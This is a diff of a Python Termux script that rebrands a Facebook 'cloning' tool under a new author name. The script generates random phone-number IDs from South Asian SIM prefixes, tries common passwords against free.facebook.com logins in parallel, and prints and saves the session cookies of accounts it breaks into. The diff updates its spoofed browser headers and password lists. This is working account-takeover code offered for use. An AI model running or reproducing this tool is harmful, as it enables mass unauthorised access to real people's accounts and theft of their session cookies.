@@ -43,7 +43,7 @@ except:pass
 
 
 ###-----------------------[TERMUX DISPLAY NME ON THE SESSION SITE]-----------------------###
-sys.stdout.write('\x1b[1;35m\x1b]2; YOUNIS XYZ ðŸ™‚ðŸ’— \x07')
+sys.stdout.write('\x1b[1;35m\x1b]2; FELLIX XYZ ðŸ™‚ðŸ’— \x07')
 
 
 
@@ -236,9 +236,9 @@ class jalan:
 
 
 ###-----------------------[CREATOR INFO]-----------------------###
-Developer = "Muhammad Younis" 
-Github = "https://github.com/YounisXyz" 
-Facebook = "https://www.facebook.com/xyzhackers" 
+Developer = "F E L L I X" 
+Github = "https://github.com/PRIVATE" 
+Facebook = "https://www.facebook.com/FELLIX" 
 Version = "0.0.1" 
 ###-----------------------[CREATOR INFO]-----------------------###
 
@@ -329,21 +329,21 @@ def clear():
 
 
 logo =f"""                      
-{R} _______  _______  _______  _______  _______ 
-{P}(  ____ )(  ___  )(       )(  ____ \(  ___  )
-{H}| (    )|| (   ) || () () || (    \/| (   ) |
-{P}| (____)|| |   | || || || || (__    | |   | |
-|     __)| |   | || |(_)| ||  __)   | |   | |
-{H}| (\ (   | |   | || |   | || (      | |   | |
-{P}| ) \ \__| (___) || )   ( || (____/\| (___) |
-{R}|/   \__/(_______)|/     \|(_______/(_______)
+{R} _______  _______  _        _       _________         
+{P}(  ____ \(  ____ \( \      ( \      \__   __/|\     /|
+{H}| (    \/| (    \/| (      | (         ) (   ( \   / )
+{P}| (__    | (__    | |      | |         | |    \ (_) / 
+|  __)   |  __)   | |      | |         | |     ) _ (  
+{H}| (      | (      | |      | |         | |    / ( ) \ 
+{P}| )      | (____/\| (____/\| (____/\___) (___( /   \ )
+{R}|/       (_______/(_______/(_______/\_______/|/     \|
 \t      {N}[{Brown} {xyztime()} {N}]
-{N}════════════════════════════════════════════
+{N}
 {P}[{H}â€¢{P}] AUTHOR   : {Developer}
 {P}[{H}â€¢{P}] GITHUB   : {Github}
 {P}[{H}â€¢{P}] FACEBOOK : {Facebook}
 {P}[{H}â€¢{P}] VERSION  : {Version}
-{N}════════════════════════════════════════════{P}"""
+{N}{P}"""
 def line():
 	print(f"{P}{50 * 'â”€'}") 
 
@@ -415,16 +415,16 @@ def creation(uid):
 def RANDOM_MENU():
     clear()
     print(f"{P}[{H}â€¢{P}] TODAY DATE :  {F} {date}")
-    line()
+    print("\033[1;37m")
     print(f"{N}[{H}âž¤{N}] COUNTRY :{H} {loc}") 
     print(f"{N}[{H}âž¤{N}] REGION  :{H} {regi}") 
     print(f"{N}[{H}âž¤{N}] NETWORK :{H} {network} ") 
     print(f"{N}[{H}âž¤{N}] YOUR IP :{H} {ip}") 
-    line()
+    print("\033[1;37m")
     print(f"{N}[{R}01{N}]{P} Random Number Cloning") 
     print(f"{N}[{R}02{N}]{P} Check Result")
     print(f"{N}[{R}00{N}]{P} Contact Developer")
-    line()
+    print("\033[1;37m")
     helloxyz = input(f"{N}[{B}f{N}]{P} CHOOSE : ")
     if helloxyz in ["1","01"]:
     	Method_Password()
@@ -463,7 +463,7 @@ def Check_Result():
 		for xyz in zyx:
 			print(f"\033[1;91m")
 			print(xyz)
-		line()
+		print("\033[1;37m")
 		input(f" [ Press Enter To Back ] ")
 		RANDOM_MENU()
 	elif xyzresult in ["0", "00"]:
@@ -477,7 +477,7 @@ def Method_Password():
     #except:pass
     print(f"{N}[{H}01{N}]{P} AUTO PASSWORD")
     print(f"{N}[{H}02{N}]{P} CHOOSE PASSWORD")
-    line()
+    print("\033[1;37m")
     helloxyz = input(f"{N}[{B}f{N}] CHOOSE : ")
     if helloxyz in ["1","01"]:
         YounisXyz_XyzCoder()
@@ -541,18 +541,18 @@ def YounisXyz_XyzCoder():
     	#Apk.append("n")
     #else:
     #	print(f"\n{P}[{R}!{P}] Please Select Between y/n .... ");time.sleep(2);YounisXyz_XyzCoder()
-    line()
+    print("\033[1;37m")
     print(f"{F}\t~ PASSWORD MENU ~") 
     line()
     print(f'''\t\033[1;97m[\x1b[1;99m\x1b[1;41m READ CAREFULLY \x1b[0m\033[1;97m]''')
-    print(f"{N}════════════════════════════════════════════{P}") 
+    print(f"{N}{P}") 
     print(f"{N}[{R}01{N}]{P} AUTO PASS 7 DIGITS         {N}[{H}ALL COUNTRY{N}]")
     print(f"{N}[{R}02{N}]{P} AUTO PASS 7 AND 11 DIGITS  {N}[{H}ALL COUNTRY{N}]")
     print(f"{N}[{R}03{N}]{P} AUTO ULTIMATE PASS {H}FOR PAKISTAN")
     print(f"{N}[{R}04{N}]{P} AUTO ULTIMATE PASS {pink}FOR INDIA")
     print(f"{N}[{R}05{N}]{P} AUTO ULTIMATE PASS {Brown}FOR BANGLADESH")
     print(f"{N}[{R}06{N}]{P} AUTO ULTIMATE PASS {B}AFGHANISTAN")
-    print(f"{N}════════════════════════════════════════════{P}") 
+    print(f"{N}{P}") 
     print(f"{P}[{R}!{P}] type '\033[1;92mpak\033[0;97m' for see pak country password or type '\033[1;92mind\033[0;97m' for see indion password or type '\033[1;92mbd\033[0;97m' for see bangladesh password or type '\033[1;92mafg\033[0;97m' for see AFG password")
     pxc = input(f'{N}[{B}f{N}] CHOOSE : ')
     if pxc in ['Pak','pak']:
@@ -567,16 +567,16 @@ def YounisXyz_XyzCoder():
     if pxc in ['afg','Afg','AFG']:
     	line();print(f"{Afghanistan}") 
     	line();input(" [ Press Enter to Back ] ");YounisXyz_XyzCoder()
-    line()
+    print("\033[1;37m")
     print(f"{P}\tAny Input Your Country Sim Code {H}>>>") 
-    line()
+    print("\033[1;37m")
     print(f'''\t\033[1;97m[\x1b[1;99m\x1b[1;42m CODE EXAMPLE ðŸ” \x1b[0m\033[1;97m]''')
-    print(f"{N}════════════════════════════════════════════{P}") 
+    print(f"{N}{P}") 
     print(f"{N}[{H}EX PAKISTAN CODE{N}]: 0300,0302,0310,0312,0333,0341")
     print(f"{N}[{pink}EX INDIA CODE{N}]: +91630,91766,91941,91981,91962,91809,91745")
     print(f"{N}[{Brown}EX BANGLADESH CODE{N}]: 88013,88014,88015,88016,88017,88018,88019")
     print(f"{N}[{B}EX AFGHANISTAN CODE{N}]: 9378, 9370, 9376, 9373, 9379")
-    print(f"{N}════════════════════════════════════════════{P}") 
+    print(f"{N}{P}") 
     code = input(f'{N}[{B}f{N}] PUT CODE : ')
     os.system("clear")
     print(logo)
@@ -591,16 +591,17 @@ def YounisXyz_XyzCoder():
         
         if "y" in Display_info:
         	jalan(f"{P}[{H}â€¢{P}] TODAY DATE :  {F} {date}")
-        	line()
+        	print("\033[1;37m")
         	jalan(f"{N}[{H}â€¢{N}] COUNTRY :{H} {loc}") 
         	jalan(f"{N}[{H}â€¢{N}] REGION  :{H} {regi}") 
         	jalan(f"{N}[{H}â€¢{N}] NETWORK :{H} {network} ") 
-        	jalan(f"{N}[{H}â€¢{N}] YOUR IP :{H} {ip}");line()
+        	jalan(f"{N}[{H}â€¢{N}] YOUR IP :{H} {ip}")
+        print("\033[1;37m")
         print(f"{N}[{H}âž¤{N}]{H} OPERATOR  {Brown}â”€âž¤{N} "+code+f"{H} TOTAL IDs {Brown}â”€âž¤{N} "+tl+" ")
         print(f"{N}[{H}âž¤{N}] TODAY DATE & TIME :{R} {day}/{month}/{year} {Brown}â”€âž¤ {H} "+str(x)+":"+str(lt()[4])+" "+ tag+" ")
         print(f"{N}[{H}âž¤{N}]{Brown} If No Result {N}[{H}ON{N}/{R}OFF{N}]{Brown} Airplane Mode")
         print(f"{N}[{H}âž¤{N}] Your {H}OK{N}/{Y}CP {N}IDs Save In {H}> {N}/sdcard/ROMEO")
-        line()
+        print("\033[1;37m")
         for xyzcoderz in user:
             uid = code+xyzcoderz
             if pxc in ['1','01']:
@@ -619,11 +620,11 @@ def YounisXyz_XyzCoder():
             	pwx = [xyzcoderz,uid,'khan1122','i love you','khankhan','khan123','khan786','baloch']
             XYZCODERS.submit(YounisXyz,uid,pwx,tl)
     print()
-    print(f"{H}<{N}════════════════════════════════════════════{H}>") 
+    print(f"{H}<{N}{H}>") 
     print(f'{N}[{H}â€¢{N}] CLONING COMPLETED')
     print(f'{P}[{H}â€¢{P}] TOTAL {H}OK {P}IDS :{H} '+str(len(ok))+'')
     print(f'{P}[{H}â€¢{P}] TOTAL {Y}CP {P}IDS :{Brown} '+str(len(cp))+'')
-    print(f"{H}<{N}════════════════════════════════════════════{H}>") 
+    print(f"{H}<{N}{H}>") 
     input(f'{P}[>] PRESS ENTER TO BACK MENU   ');os.system("clear");RANDOM_MENU()
 
 
@@ -678,24 +679,26 @@ def Choice_Password():
     	#Apk.append("n")
     #else:
     #	print(f"\n{P}[{R}!{P}] Please Select Between y/n .... ");time.sleep(2);YounisXyz_XyzCoder()
-    line()
+    print("\033[1;37m")
     print(f"{P}\tAny Input Your Country Sim Code {H}>>>") 
-    line()
+    print("\033[1;37m")
     print(f'''\t\033[1;97m[\x1b[1;99m\x1b[1;42m CODE EXAMPLE ðŸ” \x1b[0m\033[1;97m]''')
-    print(f"{N}════════════════════════════════════════════{P}") 
+    print(f"{N}{P}") 
     print(f"{N}[{H}EX PAKISTAN CODE{N}]: 0300,0302,0310,0312,0333,0341")
     print(f"{N}[{pink}EX INDIA CODE{N}]: 91766,91941,91981,91962,91809,91745")
     print(f"{N}[{Brown}EX BANGLADESH CODE{N}]: 88013,88014,88015,88016,88017,88018,88019")
     print(f"{N}[{B}EX AFGHANISTAN CODE{N}]: 9378, 9370, 9376, 9373, 9379")
-    print(f"{N}════════════════════════════════════════════{P}") 
+    print(f"{N}{P}") 
     code = input(f'{N}[{B}f{N}] PUT CODE : ')
+    print("\033[1;37m")
     print(f"{N}[{H}âž¤{N}]{P} For Example : 1000, 2000, 5000, 10000")
+    print("\033[1;37m")
     limit = int(input(f'{N}[{B}f{N}] How Many Numbers Do You Want To Add ? :{H} '))
     for nmbr in range(limit):
         nmp = ''.join(random.choice(string.digits) for _ in range(7))
         user.append(nmp)
     passx = int(input(f"{N}[{R}?{N}] How Many Password Do You Want To Add ? : ")) 
-    print(f"{N}════════════════════════════════════════════{P}") ;print(f'''\t\033[1;97m[\x1b[1;99m\x1b[1;41m PASSWORD EXAMPLE \x1b[0m\033[1;97m]''');print(f"{N}â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€{Y}âž¤{H}âž¤{R}âž¤{N}â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€{P}");print(f"{N}[{R}PAKISTAN{N}]{H} khan1122,i love you,khankhan,khan123,khan786,baloch");print(f"{N}[{R}INDIA{N}]{pink} free fire,freefire,i love you,57272300,59039200");print(f"{N}[{R}BANGLADESH{N}]{Brown} free fire,freefirei love you,Bangladesh,bangladesh");print(f"{N}[{R}AFGHANISTAN{N}]{B} free fire,freefire,i love you,khankhan,khan123,khan1122,Afghan123,Afghanistan,100200,kabul123");print(f"{N}â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€{Y}âž¤{H}âž¤{R}âž¤{N}â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€{P}");print(f"{N}[{R}!{N}]{Brown} Enter The Password As Your Choice")
+    print(f"{N}{P}") ;print(f'''\t\033[1;97m[\x1b[1;99m\x1b[1;41m PASSWORD EXAMPLE \x1b[0m\033[1;97m]''');print(f"{N}â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€{Y}âž¤{H}âž¤{R}âž¤{N}â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€{P}");print(f"{N}[{R}PAKISTAN{N}]{H} khan1122,i love you,khankhan,khan123,khan786,baloch");print(f"{N}[{R}INDIA{N}]{pink} free fire,freefire,i love you,57272300,59039200");print(f"{N}[{R}BANGLADESH{N}]{Brown} free fire,freefirei love you,Bangladesh,bangladesh");print(f"{N}[{R}AFGHANISTAN{N}]{B} free fire,freefire,i love you,khankhan,khan123,khan1122,Afghan123,Afghanistan,100200,kabul123");print(f"{N}â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€{Y}âž¤{H}âž¤{R}âž¤{N}â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€{P}");print(f"{N}[{R}!{N}]{Brown} Enter The Password As Your Choice")
     YounisXYZ = []
     for younis in range(passx):
         pww = input(f"{N}[{H}âž¤{N}]{P} Enter Password : ")
@@ -705,16 +708,17 @@ def Choice_Password():
         clear()
         if "y" in Display_info:
         	jalan(f"{P}[{H}â€¢{P}] TODAY DATE :  {F} {date}")
-        	line()
+        	print("\033[1;37m")
         	jalan(f"{N}[{H}â€¢{N}] COUNTRY :{H} {loc}") 
         	jalan(f"{N}[{H}â€¢{N}] REGION  :{H} {regi}") 
         	jalan(f"{N}[{H}â€¢{N}] NETWORK :{H} {network} ") 
-        	jalan(f"{N}[{H}â€¢{N}] YOUR IP :{H} {ip}");line()
+        	jalan(f"{N}[{H}â€¢{N}] YOUR IP :{H} {ip}")
+        print("\033[1;37m")
         print(f"{N}[{H}âž¤{N}]{H} OPERATOR  {Brown}â”€âž¤{N} "+code+f"{H} TOTAL IDs {Brown}â”€âž¤{N} "+tl+" ")
         print(f"{N}[{H}âž¤{N}] TODAY DATE & TIME :{R} {day}/{month}/{year} {Brown}â”€âž¤ {H} "+str(x)+":"+str(lt()[4])+" "+ tag+" ")
         print(f"{N}[{H}âž¤{N}]{Brown} If No Result {N}[{H}ON{N}/{R}OFF{N}]{Brown} Airplane Mode")
         print(f"{N}[{H}âž¤{N}] Your {H}OK{N}/{Y}CP {N}IDs Save In {H}> {N}/sdcard/ROMEO")
-        line()
+        print("\033[1;37m")
         for xyzcoderz in user:
             #pwx = [xyzcoderz[1:]]
             uid = code+xyzcoderz
@@ -723,11 +727,11 @@ def Choice_Password():
                 pwx.append(Alina)
             XYZCODERS.submit(YounisXyz,uid,pwx,tl)
     print()
-    print(f"{H}<{N}════════════════════════════════════════════{H}>") 
+    print(f"{H}<{N}{H}>") 
     print(f'{N}[{H}â€¢{N}] CLONING COMPLETED')
     print(f'{P}[{H}â€¢{P}] TOTAL {H}OK {P}IDS :{H} '+str(len(ok))+'')
     print(f'{P}[{H}â€¢{P}] TOTAL {Y}CP {P}IDS :{Brown} '+str(len(cp))+'')
-    print(f"{H}<{N}════════════════════════════════════════════{H}>") 
+    print(f"{H}<{N}{H}>") 
     input(f'{P}[>] PRESS ENTER TO BACK MENU   ');os.system("clear");RANDOM_MENU()
 
     
@@ -754,21 +758,26 @@ def YounisXyz(uid,pwx,tl):
             "pass":ps,
             "login":"Log In"}
             xyzheader_fuck = {
-    'authority': 'x.facebook.com',
+    'authority': 'free.facebook.com',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'en-US,en;q=0.9',
     'cache-control': 'max-age=0',
-    'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="99"',
-    'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-platform': '"Android"',
-    'upgrade-insecure-requests': '1',
-    'user-agent': XyzAgents,
-    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-    'sec-fetch-site': 'same-origin',
-    'sec-fetch-mode': 'navigate',
-    'sec-fetch-user': '?1',
+    'referer': 'https://free.facebook.com/login/device-based/regular/login/?shbl=1&refsrc=deprecated&ref=dbl',
+    'sec-ch-prefers-color-scheme': 'dark',
+    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
+    'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.116"',
+    'sec-ch-ua-mobile': '?0',
+    'sec-ch-ua-model': '""',
+    'sec-ch-ua-platform': '"Linux"',
+    'sec-ch-ua-platform-version': '""',
     'sec-fetch-dest': 'document',
-    'referer': 'https://m.facebook.com/login',
-    'accept-language': 'en-US,en;q=0.9',}
-            lo = session.post('https://x.facebook.com/login/?ref=dbl&fl&login_from_aymh=1',data=log_data,headers=xyzheader_fuck).text
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'same-origin',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+    'viewport-width': '980',}
+            lo = session.post('https://free.facebook.com/login/?ref=dbl&fl&login_from_aymh=1',data=log_data,headers=xyzheader_fuck).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
@@ -778,7 +787,7 @@ def YounisXyz(uid,pwx,tl):
                 #except:pass
                 if "y" in Cookie:
                 	print(f'\r{H}[FILLIX-OK] '+uid+' | '+ps+ '\033[1;93m '+creation(uid)+' ')
-                	print(f"\033[1;97m[\033[1;92mCOOKIEðŸª\033[1;97m]: {coki}")
+                	print(f"\033[1;97m[\033[1;92mCOOKIE\033[1;97m]: {coki}")
                 	#check_applications(session,coki)
                 if "n" in Cookie:
                 	print(f'\r{H}[FILLIX-OK] '+uid+' | '+ps+ '\033[1;93m '+creation(uid)+' ')
